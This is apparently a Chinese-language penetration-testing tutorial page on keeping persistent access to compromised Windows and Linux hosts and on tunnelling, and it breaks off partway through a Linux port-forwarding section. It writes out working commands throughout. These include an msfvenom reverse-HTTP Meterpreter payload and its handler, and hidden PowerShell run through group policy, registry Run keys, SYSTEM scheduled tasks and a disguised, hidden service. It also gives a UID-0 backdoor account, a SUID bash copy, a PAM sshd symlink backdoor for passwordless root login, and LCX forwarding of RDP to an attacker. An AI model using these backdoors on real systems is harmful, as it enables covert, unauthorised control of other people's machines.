<h4 id="启动项维持" tabindex="-1"><a class="header-anchor" href="#启动项维持" aria-hidden="true">#</a> 启动项维持</h4>
<p><strong>启动项</strong>就是开机的时候系统会自动前台或者后台运行加载的程序。</p>
<h5 id="组策略维持" tabindex="-1"><a class="header-anchor" href="#组策略维持" aria-hidden="true">#</a> 组策略维持</h5>
<h6 id="组策略介绍" tabindex="-1"><a class="header-anchor" href="#组策略介绍" aria-hidden="true">#</a> 组策略介绍</h6>
<p><strong>组策略</strong>（<code v-pre>Group Policy</code>）是微软家族操作系统的一个特性，它可以控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为<strong>本地组策略</strong>（<code v-pre>LGPO</code>或<code v-pre>LocalGPO</code>），这可以在独立且非域的计算机上管理组策略对象。</p>
<p><strong>利用原理</strong>： 在组策略中添加 <code v-pre>payload</code>，利用组策略的自启动策略来加载 <code v-pre>payload</code> 文件</p>
<h6 id="组策略位置" tabindex="-1"><a class="header-anchor" href="#组策略位置" aria-hidden="true">#</a> 组策略位置</h6>
<ol>
<li>
<p>打开组策略</p>
<p><code v-pre>gpedit.msc</code></p>
</li>
<li>
<p>在【Windows设置】【脚本（启动/关闭）】，双击【启动】</p>
</li>
<li>
<p>选择要添加的脚本或者 <code v-pre>powershell</code></p>
</li>
</ol>
<h6 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式" aria-hidden="true">#</a> 利用方式</h6>
<ol>
<li>
<p><code v-pre>Kali</code> 上生成 <code v-pre>powshell</code> （以 <code v-pre>msf</code> 为例）</p>
<p><code v-pre>msfvenom -p windows/x64/meterpreter/reverse_http -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.xxx.xxx lport=8888 -f psh -o shell.ps1</code></p>
</li>
<li>
<p>将 <code v-pre>shell.ps1</code> 传输到目标机器上</p>
</li>
<li>
<p><code v-pre>Kali</code> 启动 <code v-pre>msf</code> 监听</p>
<p><code v-pre>msfconsole</code></p>
<p><code v-pre>use exploit/multi/handler</code></p>
<p><code v-pre>set payload windows/x64/meterpreter/reverse_http</code></p>
<p><code v-pre>set LHOST 192.168.xxx.xxx</code></p>
<p><code v-pre>set LPORT 8888</code></p>
<p><code v-pre>run</code></p>
</li>
<li>
<p>运行 <code v-pre>shell.ps1</code> （测试是否正常）</p>
<p><code v-pre>powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File shell.ps1</code></p>
<ul>
<li><code v-pre>-w hidden</code> 隐藏窗口</li>
<li><code v-pre>-ExecutionPolicy Bypass</code> 绕过策略</li>
<li><code v-pre>-NoExit</code> 不退出</li>
</ul>
</li>
<li>
<p>创建一个 <code v-pre>bat</code> 脚本（命名 <code v-pre>1.bat</code>），将运行 <code v-pre>shell.ps1</code> 的命令放在里面</p>
<div class="language-bat line-numbers-mode" data-ext="bat"><pre v-pre class="language-bat"><code>@echo off
powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File shell.ps1
exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>打开组策略，在【Windows设置】【脚本（启动/关闭）】，双击【启动】，添加脚本，选中 <code v-pre>1.bat</code></p>
</li>
</ol>
<h5 id="启动文件夹维持" tabindex="-1"><a class="header-anchor" href="#启动文件夹维持" aria-hidden="true">#</a> 启动文件夹维持</h5>
<h6 id="启动文件夹介绍" tabindex="-1"><a class="header-anchor" href="#启动文件夹介绍" aria-hidden="true">#</a> 启动文件夹介绍</h6>
<p><strong>启动文件夹</strong>是 Windows 的 C 盘下的一个文件夹，这个文件夹中的所有程序都会在系统开机时自动启动。</p>
<h6 id="启动文件夹位置" tabindex="-1"><a class="header-anchor" href="#启动文件夹位置" aria-hidden="true">#</a> 启动文件夹位置</h6>
<blockquote>
<p>启动文件夹</p>
<p><code v-pre>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code> # 系统级，需要 <code v-pre>system</code> 权限</p>
<p><code v-pre>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start\Menu\Programs\Startup</code> # 用户级，普通用户就可以</p>
<p>组策略脚本启动文件夹</p>
<p><code v-pre>C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup</code></p>
<p><code v-pre>C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown</code></p>
<p><code v-pre>C:\Windows\System32\GroupPolicy\User\Scripts\Login</code></p>
<p><code v-pre>C:\Windows\System32\GroupPolicy\User\Scripts\Logoff</code></p>
</blockquote>
<h5 id="注册表启动项维持" tabindex="-1"><a class="header-anchor" href="#注册表启动项维持" aria-hidden="true">#</a> 注册表启动项维持</h5>
<h6 id="注册表介绍" tabindex="-1"><a class="header-anchor" href="#注册表介绍" aria-hidden="true">#</a> 注册表介绍</h6>
<p>**注册表（繁体系统中称之为“登录档”）**是 Windows 操作系统中的一个重要的数据库，用于存储系统和应用程序的设置信息。</p>
<h6 id="注册表位置" tabindex="-1"><a class="header-anchor" href="#注册表位置" aria-hidden="true">#</a> 注册表位置</h6>
<p><code v-pre>regedit</code></p>
<h6 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1" aria-hidden="true">#</a> 利用方式</h6>
<ol>
<li>
<p>Windows 注册表中存在的自启动后门较多。此处是较为经典的两类</p>
<blockquote>
<p><code v-pre># HKEY_LOCAL_MACHINE </code> 类</p>
<p><code v-pre>HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\Run</code></p>
<p><code v-pre>HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunOnce</code></p>
<p><code v-pre>HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunOnceEx</code></p>
<p><code v-pre>HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunService</code></p>
<p><code v-pre>HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\RunServiceOnce</code></p>
</blockquote>
<blockquote>
<p><code v-pre># HKEY_CURRENT_USER</code> 类</p>
<p><code v-pre>HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\Run</code></p>
<p><code v-pre>HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunOnce</code></p>
<p><code v-pre>HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunOnceEx</code></p>
<p><code v-pre>HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunService</code></p>
<p><code v-pre>HKEY_CURRENT_USER\Softwar\Microsoft\Windows\CurrentVersion\RunServiceOnce</code></p>
</blockquote>
</li>
<li>
<p><code v-pre>reg add</code> 命令将 <code v-pre>payload</code> 添加到注册表启动项中</p>
<p><code v-pre>reg add &quot;HKEY_LOCAL_MACHINE\Softwar\Microsoft\Windows\CurrentVersion\Run&quot; /v shell /t REG_SZ /d &quot;C:\Users\Administrator\Desktop\1.bat&quot;</code></p>
</li>
</ol>
<h4 id="计划任务维持" tabindex="-1"><a class="header-anchor" href="#计划任务维持" aria-hidden="true">#</a> 计划任务维持</h4>
<h5 id="计划任务介绍" tabindex="-1"><a class="header-anchor" href="#计划任务介绍" aria-hidden="true">#</a> 计划任务介绍</h5>
<p>计划任务是系统常见的功能，利用计划任务，可以将任何脚本、程序或者文档安排在某个指定的时间运行。计划任务会在每次系统启动的时候自动启动并在后台运行。</p>
<h6 id="计划任务的打开方式" tabindex="-1"><a class="header-anchor" href="#计划任务的打开方式" aria-hidden="true">#</a> 计划任务的打开方式</h6>
<ol>
<li>【管理工具】-【计划任务程序】</li>
<li>【控制面板】-【计划任务】</li>
<li><code v-pre>taskschd.msc</code> 命令</li>
</ol>
<h5 id="计划任务生成方式" tabindex="-1"><a class="header-anchor" href="#计划任务生成方式" aria-hidden="true">#</a> 计划任务生成方式</h5>
<ol>
<li>
<p><code v-pre>schtasks</code></p>
<blockquote>
<p>在任意用户登录中以 <code v-pre>SYSTEM</code> 的形式执行计划任务</p>
<p><code v-pre>schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件命令&quot; /sc onlogon /ru System</code></p>
<p>在系统启动期间或用户会话处于非活动状态（空闲模式）时执行</p>
<p><code v-pre>schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件名&quot; /sc onidle /i 30</code></p>
<p>在系统启动的时候以 <code v-pre>SYSTEM</code> 的形式执行计划任务</p>
<p><code v-pre>schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件命令&quot; /sc onstart /ru System</code></p>
<p>计划任务以 <code v-pre>SYSTEM</code> 权限每 10 分钟运行一次</p>
<p><code v-pre>schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件命令&quot; /sc minute /mo 10 ru system</code></p>
</blockquote>
<blockquote>
<p>例： 计划任务进行权限维持（当系统启动时以 <code v-pre>SYSTEM</code> 用户调取 <code v-pre>powershell</code> 运行 <code v-pre>shell.ps1</code>）</p>
<p><code v-pre>schtasks /create /tn shell /tr &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\User\Administrator\Desktop\keep\shell.ps1&quot; /sc onstart /ru system</code></p>
</blockquote>
</li>
<li>
<p><code v-pre>at</code> 命令（Windows 早期版本）</p>
</li>
<li>
<p><code v-pre>powershell</code></p>
</li>
</ol>
<h4 id="服务维持" tabindex="-1"><a class="header-anchor" href="#服务维持" aria-hidden="true">#</a> 服务维持</h4>
<h5 id="服务介绍" tabindex="-1"><a class="header-anchor" href="#服务介绍" aria-hidden="true">#</a> 服务介绍</h5>
<p>服务（即，以前的 <code v-pre>NT</code> 服务）使用户可以能够创建自己在 <code v-pre>Windows</code> 会话中长时间运行的可执行应用程序，这些服务可以在计算机启动的时候自动启动，也可以暂停和重新启动，而且不显示任何的用户界面。</p>
<p>这种服务非常适合在服务器上使用，或任何时候，为了不影响在同一台计算机上工作的其他用户，需要长时间运行功能时使用。还可以在不同于登录用户的特定用户账户或默认计算机账户的安全上下文中运行服务</p>
<h5 id="服务维持权限" tabindex="-1"><a class="header-anchor" href="#服务维持权限" aria-hidden="true">#</a> 服务维持权限</h5>
<p>创建一个服务（服务名为： <code v-pre>shell</code>）启动 <code v-pre>ps1</code> 脚本</p>
<blockquote>
<p>创建服务</p>
<p><code v-pre>sc create shell start= auto binPath= &quot;cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\shell.ps1&quot; -obj= Localsystem</code></p>
<p>伪装服务描述</p>
<p><code v-pre>sc description &quot;shell&quot; &quot;伪装后的服务描述&quot;</code></p>
<p>设置服务自启</p>
<p><code v-pre>sc config &quot;shell&quot; start= auto</code></p>
<p>启动服务</p>
<p><code v-pre>net start &quot;shell&quot;</code></p>
</blockquote>
<h5 id="隐藏服务" tabindex="-1"><a class="header-anchor" href="#隐藏服务" aria-hidden="true">#</a> 隐藏服务</h5>
<p>隐藏服务</p>
<div class="language-powershell line-numbers-mode" data-ext="powershell"><pre v-pre class="language-powershell"><code><span class="token function">sc</span> sdset shell <span class="token string">"D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)
(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>恢复隐藏服务</p>
<div class="language-powershell line-numbers-mode" data-ext="powershell"><pre v-pre class="language-powershell"><code><span class="token function">sc</span> sdset shell <span class="token string">"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="其他" tabindex="-1"><a class="header-anchor" href="#其他" aria-hidden="true">#</a> 其他</h4>
<h3 id="linux-权限维持" tabindex="-1"><a class="header-anchor" href="#linux-权限维持" aria-hidden="true">#</a> Linux  权限维持</h3>
<h4 id="用户维持-1" tabindex="-1"><a class="header-anchor" href="#用户维持-1" aria-hidden="true">#</a> 用户维持</h4>
<h5 id="用户文件介绍" tabindex="-1"><a class="header-anchor" href="#用户文件介绍" aria-hidden="true">#</a> 用户文件介绍</h5>
<p>在 <code v-pre>Linux</code> 系统中，存在着两个特殊的文件 <code v-pre>/etc/passwd</code> 和 <code v-pre>/etc/shadow</code>。</p>
<p>这两个文件中存储着用户名和加密后的密码，在目前大多数 <code v-pre>Linux</code> 系统中，将加密后的用户密码存放在 <code v-pre>/etc/shadow</code> 文件中，但是，这个文件只能 <code v-pre>root</code> 用户查看。</p>
<h6 id="etc-passwd-介绍" tabindex="-1"><a class="header-anchor" href="#etc-passwd-介绍" aria-hidden="true">#</a> <code v-pre>/etc/passwd</code> 介绍</h6>
<blockquote>
<p>格式：</p>
<p>用户名： 密码： <code v-pre>UID</code>（用户<code v-pre>ID</code>）： <code v-pre>GID</code>（组<code v-pre>ID</code>）： 描述： 主目录： 默认<code v-pre>Shell</code></p>
<ol>
<li>
<p>用户名</p>
<p>就是一串代表用户身份的字符串，仅仅是方便用户记忆。 <code v-pre>Linux</code> 系统是通过 <code v-pre>UID</code> 来识别用户身份、分配用户权限的。</p>
</li>
<li>
<p>密码</p>
<p><code v-pre>x</code> 表示此用户设有密码，真正的密码保存在 <code v-pre>/etc/shadow</code> 文件中。在早期的 <code v-pre>Unix</code> 中，这里保存的是真正的加密密码串，现在的 <code v-pre>Linux</code> 系统这里基本都是 <code v-pre>x</code>，真正的密码放置在 <code v-pre>/etc/shadow</code> 文件中，此文件只有 <code v-pre>root</code> 用户可以浏览操作，最大限度的保证了密码的安全。</p>
</li>
<li>
<p><code v-pre>UID</code></p>
<p>用户 <code v-pre>ID</code>，每个用户的唯一标识符，是一个 <code v-pre>0~65535</code> 之间的数字。</p>
<table>
<thead>
<tr>
<th><code v-pre>UID</code>范围</th>
<th>用户身份</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>超级用户，也就是系统管理员账户。在 <code v-pre>Linux</code> 中，只需要把其他用户的 <code v-pre>UID</code> 改为 <code v-pre>0</code>，就可以把普通用户升级为超级管理员。</td>
</tr>
<tr>
<td>1~999（旧版本是 1 ~ 499）</td>
<td>系统用户（伪用户）。这个范围的 <code v-pre>UID</code> 是保留给系统使用的。其中 1~99 用于系统自行创建的账户； 100 ~ 999 分配给由系统账户需求的用户。（这只是一个公认约定的习惯而已，实际上除了 <code v-pre>0</code> 以外，其他的 <code v-pre>UID</code> 并无不同。</td>
</tr>
<tr>
<td>1000~65535</td>
<td>普通用户。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><code v-pre>GID</code></p>
<p>组 <code v-pre>ID</code>，表示用户初始组的 <code v-pre>ID</code> 号。初始组，是初建用户时用户所属的组，后面附加的组不计入</p>
</li>
<li>
<p>描述</p>
</li>
<li>
<p>主目录</p>
<p>用户登录后有操作权限的访问目录，通常称为用户的主目录</p>
</li>
<li>
<p>默认 <code v-pre>Shell</code></p>
<p><code v-pre>Shell</code> 是 <code v-pre>Linux</code> 的命令解释器，是用户和 <code v-pre>Linux</code> 内核之间沟通的桥梁。 <code v-pre>Linux</code> 默认的解释器是 <code v-pre>/bin/bash</code></p>
</li>
</ol>
</blockquote>
<h6 id="etc-shadow-介绍" tabindex="-1"><a class="header-anchor" href="#etc-shadow-介绍" aria-hidden="true">#</a> <code v-pre>/etc/shadow</code> 介绍</h6>
<p>用于存储 <code v-pre>Linux</code> 系统中用户的密码信息，又称之为“影子文件”。</p>
<blockquote>
<p>格式：</p>
<p>用户名： 加密密码： 最后一个修改时间： 最小修改时间间隔： 密码有效期： 密码需要变更前的警告天数： 密码过期后的宽限天数： 账号失效时间： 保留字段</p>
</blockquote>
<h5 id="特权用户维持" tabindex="-1"><a class="header-anchor" href="#特权用户维持" aria-hidden="true">#</a> 特权用户维持</h5>
<p>添加普通用户</p>
<blockquote>
<p>方法1： 创建一个用户名为 <code v-pre>guest</code>， 密码为 <code v-pre>123456</code> 的普通用户（<code v-pre>-p</code> 参数后面需要执行 <code v-pre>openssl</code> 命令手动加密密码，否则将明文密码存储到 <code v-pre>shadow</code> 文件后依然无法登录）</p>
<p><code v-pre>useradd -p `openssl passwd -1 -salt 'salt' 123456` guest</code></p>
<p>方法2： 同上，但是采用 <code v-pre>$(xxx)</code> 的方式执行系统命令</p>
<p><code v-pre>useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</code></p>
<p>方法3： <code v-pre>chpasswd</code> 方式</p>
<p><code v-pre>useradd guest; echo 'guest:123456' | chpasswd</code></p>
<p>方法4： <code v-pre>echo -e</code>  方式</p>
<p><code v-pre>useradd guest; echo -e &quot;123456\n123456\n&quot; | passwd guest</code></p>
</blockquote>
<p>添加超级用户：</p>
<blockquote>
<p>创建超级用户</p>
<p><code v-pre>useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest </code></p>
</blockquote>
<h4 id="suid-维持" tabindex="-1"><a class="header-anchor" href="#suid-维持" aria-hidden="true">#</a> Suid 维持</h4>
<h5 id="suid-介绍" tabindex="-1"><a class="header-anchor" href="#suid-介绍" aria-hidden="true">#</a> Suid 介绍</h5>
<p><code v-pre>Suid</code> 是一种特殊权限，设置了 <code v-pre>suid</code> 的程序文件，在用户执行该程序时，用户的权限是该程序文件属主权限，例如程序文件的属主是 <code v-pre>root</code>， 那么执行该程序的用户就将暂时获得 <code v-pre>root</code> 账户的权限。 <code v-pre>sgid</code> 和 <code v-pre>suid</code> 类似，只是执行程式的时候获取的是文件属主的权限。 <code v-pre>passwd</code> 这个命令程序的权限设置，就是 <code v-pre>suid</code> 权限。</p>
<ul>
<li>只有可执行的二进制程序文件才可以设定 <code v-pre>suid</code> 权限，非二进制文件设置 <code v-pre>suid</code> 权限没有任何意义</li>
<li>命令执行者要对该程序文件拥有执行 （<code v-pre>x</code>）权限</li>
<li>命令执行者在执行该程序的时获得改程序文件属主的身份</li>
<li><code v-pre>Suid</code> 权限只在该程序执行过程中有效，也就是说身份改变只是程序执行过程中生效的。</li>
</ul>
<h5 id="suid-维持-1" tabindex="-1"><a class="header-anchor" href="#suid-维持-1" aria-hidden="true">#</a> Suid 维持</h5>
<ol>
<li>
<p>找到 <code v-pre>bash</code> 文件</p>
<p><code v-pre>whereis bash</code></p>
</li>
<li>
<p>复制到普通用户环境能接触到的目录下</p>
<p><code v-pre>cp /bin/bash /tmp/.bash</code></p>
</li>
<li>
<p>赋权</p>
<p><code v-pre>chmod 4755 /tmp/.bash</code> 或 <code v-pre>chmod +s /tmp/.bash</code></p>
</li>
<li>
<p>创建普通用户</p>
<p><code v-pre>useradd -p `openssl passwd -1 -salt 'salt' 123456` jack </code></p>
</li>
<li>
<p>使用普通用户登录，运行 <code v-pre>/tmp/.bash</code>，这个 <code v-pre>bash</code> 就是 <code v-pre>root</code> 权限的</p>
</li>
</ol>
<h4 id="pam-软连接维持" tabindex="-1"><a class="header-anchor" href="#pam-软连接维持" aria-hidden="true">#</a> PAM 软连接维持</h4>
<h5 id="pam-介绍" tabindex="-1"><a class="header-anchor" href="#pam-介绍" aria-hidden="true">#</a> PAM 介绍</h5>
<p><code v-pre>PAM</code> 认证一般遵循这样的顺序： <code v-pre>Service(服务)</code> --&gt; <code v-pre>PAM(配置文件)</code> --&gt; <code v-pre>pam_*.so</code>。</p>
<p><code v-pre>PAM</code> 认证首先要确定哪一项服务，然后加载相应的 <code v-pre>PAM</code> 的配置文件（位于 <code v-pre>/etc/pam.d</code> 下），最后调用认证文件（位于<code v-pre>/lib/security</code>下）进行安全认证，用户访问服务器的时候，服务器的某一个服务程序把用户的请求发送到 <code v-pre>PAM</code> 模块进行认证。 对于不同的服务器应用程序所对应的 <code v-pre>PAM</code> 模块也是不同的。</p>
<p>如果想查看某个程序是否支持 <code v-pre>PAM</code> 使用 <code v-pre>ls /etc/pam.d</code>。</p>
<h5 id="软连接介绍" tabindex="-1"><a class="header-anchor" href="#软连接介绍" aria-hidden="true">#</a> 软连接介绍</h5>
<p>软连接称之为符号链接（Symbolic Link），也叫软连接。类似于 Windows 的快捷方式。</p>
<p>软连接实际上是一个特殊的文本文件，其中包含有另一个文件的位置信息。</p>
<blockquote>
<p>创建一个 <code v-pre>test.txt</code> 文件用来演示</p>
<p><code v-pre>touch test.txt</code></p>
<p>创建软连接</p>
<p><code v-pre>ln -fs /var/www/html/1.txt test.txt</code></p>
<p>查看软连接（<code v-pre>text.txt</code> 指向了 <code v-pre>/var/www/html/1.txt</code>）</p>
<p><code v-pre>cat test.txt</code></p>
</blockquote>
<h5 id="ssd-软连接后门原理" tabindex="-1"><a class="header-anchor" href="#ssd-软连接后门原理" aria-hidden="true">#</a> SSD  软连接后门原理</h5>
<p><code v-pre>SSD</code> 软连接是 <code v-pre>Linux</code> 下经典的权限维持方法之一。</p>
<p>其中涉及到一个比较重要的模块 <code v-pre>pam_rootok.so</code>。 这个模块的功能是<strong>如果用户<code v-pre>UID</code>时<code v-pre>0</code>，则返回成功</strong>，当<code v-pre>/etx/pam.d/ssh</code> 文件配置了 <code v-pre>auth sufficient pam_rootok.so</code> 时，<strong>可以不需要密码登录</strong>。</p>
<p>当在被控端执行命令 <code v-pre>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su- oPort=1234</code> 建立 <code v-pre>shd</code> 的软连接后门， <code v-pre>PAM</code> 认证时就会根据软连接名字到 <code v-pre>/etc/pam.d</code> 目录下寻找对应的 <code v-pre>PAM</code> 认证文件，由于软连接的文件名为 <code v-pre>su</code>， 所以 <code v-pre>SSH</code> 的认证文件就被替换成了 <code v-pre>/etc/pam.d/su</code>， 而 <code v-pre>su</code> 中默认配置了 <code v-pre>auth sufficient pam_rootok.so</code>， 从而导致 <code v-pre>SSH</code> 可以免密登录。</p>
<h5 id="软连接维持权限实现" tabindex="-1"><a class="header-anchor" href="#软连接维持权限实现" aria-hidden="true">#</a> 软连接维持权限实现</h5>
<ol>
<li>
<p>判断当前计算机 <code v-pre>SSH</code> 是否开启 <code v-pre>PAM</code> 认证</p>
<p><code v-pre>cat /etc/ssh/sshd_config | grep UsePAM</code> 或 <code v-pre>ls /etc/pam.d</code> 中查看</p>
</li>
<li>
<p>查看 <code v-pre>pmd.d</code>  文件下哪些文件配置了 <code v-pre>pam_rootok</code></p>
<p><code v-pre>find /etc/pam.d | xargs grep &quot;pam_rootok&quot;</code></p>
</li>
<li>
<p>以 <code v-pre>root</code> 权限建立 <code v-pre>sshd</code> 的软连接（<code v-pre>chsh</code> 配置了 <code v-pre>rootok</code> 认证）</p>
<p><code v-pre>ln -sf /usr/sbin/sshd /tmp/chsh</code></p>
</li>
<li>
<p>更改 <code v-pre>chsh</code> 的端口</p>
<p><code v-pre>/tmp/chsh -oPort 23333</code></p>
</li>
<li>
<p>登录（输入任意密码，即可登录）</p>
<p><code v-pre>ssh root@[IP地址] -p [后门端口]</code></p>
</li>
</ol>
<h4 id="公私钥维持" tabindex="-1"><a class="header-anchor" href="#公私钥维持" aria-hidden="true">#</a> 公私钥维持</h4>
<h4 id="计划任务维持-1" tabindex="-1"><a class="header-anchor" href="#计划任务维持-1" aria-hidden="true">#</a> 计划任务维持</h4>
<h2 id="隧道搭建" tabindex="-1"><a class="header-anchor" href="#隧道搭建" aria-hidden="true">#</a> 隧道搭建</h2>
<h3 id="隧道技术基础-相关概念" tabindex="-1"><a class="header-anchor" href="#隧道技术基础-相关概念" aria-hidden="true">#</a> 隧道技术基础（相关概念）</h3>
<h4 id="端口转发和端口映射" tabindex="-1"><a class="header-anchor" href="#端口转发和端口映射" aria-hidden="true">#</a> 端口转发和端口映射</h4>
<blockquote>
<p>端口转发，也称之为做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。
简单来说，端口转发就是将一个端口收到的流量转发到另一个端口</p>
</blockquote>
<blockquote>
<p>端口映射，是 <code v-pre>NAT</code> 的一种，功能是把在公网的地址转换成私有地址。
简单来说，端口映射就是将一个端口映射到另一个端口供其他人使用</p>
</blockquote>
<h4 id="http-代理和-socks-代理" tabindex="-1"><a class="header-anchor" href="#http-代理和-socks-代理" aria-hidden="true">#</a> HTTP 代理和 Socks 代理</h4>
<blockquote>
<p>HTTP 代理使用的是 HTTP 协议，工作在应用层，主要是用来代理浏览器访问网页</p>
</blockquote>
<blockquote>
<p><code v-pre>Socks</code> 代理使用的是 <code v-pre>Socks</code> 协议，工作在会话层，主要用来传递数据包。
<code v-pre>Socks</code> 代理又分为 <code v-pre>Socks4</code> 和 <code v-pre>Socks5</code>，<code v-pre>Socks4</code> 只支持 <code v-pre>TCP</code>，而 <code v-pre>Socks5</code> 支持 <code v-pre>TCP</code> 和 <code v-pre>UDP</code></p>
</blockquote>
<h4 id="反弹-shell" tabindex="-1"><a class="header-anchor" href="#反弹-shell" aria-hidden="true">#</a> 反弹 Shell</h4>
<blockquote>
<p>反弹 <code v-pre>Shell</code>（<code v-pre>Reverse Shell</code>），就是控制端监听某 <code v-pre>TCP/UDP</code> 端口，被控端发送请求到该端口，并将其命令行的输入输出转到控制端，<code v-pre>Reverse Shell</code> 与 <code v-pre>telnet、</code> <code v-pre>ssh</code> 等标准 <code v-pre>Shell</code> 对应，本质上是网络概念的用户端和服务端的角色反转。</p>
</blockquote>
<h4 id="正向代理和反向代理" tabindex="-1"><a class="header-anchor" href="#正向代理和反向代理" aria-hidden="true">#</a> 正向代理和反向代理</h4>
<blockquote>
<p>正向代理是从攻击者电脑主动访问目标机器。 例如通过主动访问目标建立 <code v-pre>Shell</code> 就是正向 <code v-pre>Shell</code></p>
</blockquote>
<blockquote>
<p>反向代理是从目标机器主动连接攻击者电脑。 例如通过在目标机器执行命令访问攻击者电脑建立的 <code v-pre>Shell</code> 就是反向 <code v-pre>Shell</code></p>
</blockquote>
<h4 id="icpm-隧道和-dns-隧道" tabindex="-1"><a class="header-anchor" href="#icpm-隧道和-dns-隧道" aria-hidden="true">#</a> ICPM 隧道和 DNS 隧道</h4>
<h3 id="端口转发" tabindex="-1"><a class="header-anchor" href="#端口转发" aria-hidden="true">#</a> 端口转发</h3>
<h4 id="lcx-端口转发" tabindex="-1"><a class="header-anchor" href="#lcx-端口转发" aria-hidden="true">#</a> LCX 端口转发</h4>
<h5 id="lcx-介绍" tabindex="-1"><a class="header-anchor" href="#lcx-介绍" aria-hidden="true">#</a> LCX 介绍</h5>
<blockquote>
<p>LCX 是一款端口转发工具，分 Windows 版和 Linux 版，Linux 版为 PortMap。</p>
</blockquote>
<blockquote>
<p>LCX 有端口映射和端口转发两大功能。例如当目标的 3389 端口只对内开放而不对外开放时，可以使用端口映射将 3389 端口映射到目标的其他端口使用； 当目标处于内网或者目标配置的策略只允许访问固定的某一端口时，也可以通过端口转发突破限制。</p>
</blockquote>
<p>Windows 版本 LCX 用法：</p>
<blockquote>
<p>端口转发：
<code v-pre>Lcx -listen &lt;监听slave请求的端口&gt; &lt;等待连接的端口&gt;</code>
<code v-pre>Lcx -slave &lt;攻击机IP&gt; &lt;监听端口&gt; &lt;目标IP&gt; &lt;目标端口&gt;</code></p>
<p>端口映射：
<code v-pre>Lcx -tran &lt;等待连接的端口&gt; &lt;目标IP&gt; &lt;目标端口&gt;</code></p>
</blockquote>
<p>Linux 版本 PortMap 用法：</p>
<blockquote>
<p><code v-pre>Useage: ./portmap -m method [h1 host1] -p1 port1 [h2 host2] -p2 port2 [-v] [-log filename]</code>
<code v-pre>-v: version</code>
<code v-pre>-h1: host1</code>
<code v-pre>-h2: host2</code>
<code v-pre>-p1: port1</code>
<code v-pre>-p2: port2</code>
<code v-pre>-log: log the data</code>
<code v-pre>-m: the action method for this tool</code>
<code v-pre>1: listen on port1 and connect to host2:port2</code>
<code v-pre>2: listen on port1 and port2</code>
<code v-pre>3: connect to host1:port1 and host2:port2</code></p>
</blockquote>
<h5 id="场景复现-windows-内网" tabindex="-1"><a class="header-anchor" href="#场景复现-windows-内网" aria-hidden="true">#</a> 场景复现（Windows 内网）</h5>
<ul>
<li>
<p>实验环境</p>
<ul>
<li>攻击机： <code v-pre>192.168.xxx.aaa</code></li>
<li>靶机： <code v-pre>192.168.xxx.bbb</code></li>
</ul>
</li>
<li>
<p>场景复现</p>
<ol>
<li>在攻击机上监听本地 <code v-pre>53</code> 端口并转发到本地 <code v-pre>1111</code> 端口
<code v-pre>lcx -listen 53 1111</code></li>
<li>在靶机上将 <code v-pre>3389</code> 端口转发到攻击机的 <code v-pre>53</code> 端口
<code v-pre>lcx -slave 192.168.xxx.aaa 53 127.0.0.1 3389</code></li>
<li>在攻击机上连接远程桌面，地址为： <code v-pre>127.0.0.1: 1111</code></li>
</ol>
</li>
</ul>
<h5 id="场景复现-linux-公网" tabindex="-1"><a class="header-anchor" href="#场景复现-linux-公网" aria-hidden="true">#</a> 场景复现（Linux 公网）</h5>
<ul>
<li>
<p>实验环境</p>
<ul>
<li>攻击机：<code v-pre>192.168.xxx.aaa</code></li>
<li>靶机：<code v-pre>192.168.xxx.bbb</code></li>
